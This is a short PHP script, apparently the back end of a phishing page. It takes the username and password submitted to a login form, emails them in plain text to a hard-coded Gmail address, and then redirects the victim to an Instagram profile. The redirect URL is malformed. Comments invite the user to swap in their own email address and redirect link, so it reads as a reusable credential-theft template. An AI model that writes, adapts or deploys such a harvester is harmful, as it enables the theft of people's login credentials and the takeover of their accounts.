<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $to = "philoso29@gmail.com";  // Replace with your email address
    $subject = "New Login Attempt";
    $message = "Username: $username\nPassword: $password";
    $headers = "From: noreply@example.com";

    if (mail($to, $subject, $message, $headers)) {
        header("Location: https://https://www.instagram.com/caesariq.1?igsh=MXdjemthMnR1eGk1Yg==");  // Replace with your redirect link
        exit();
    } else {
        echo "Email sending failed.";
    }
}
?>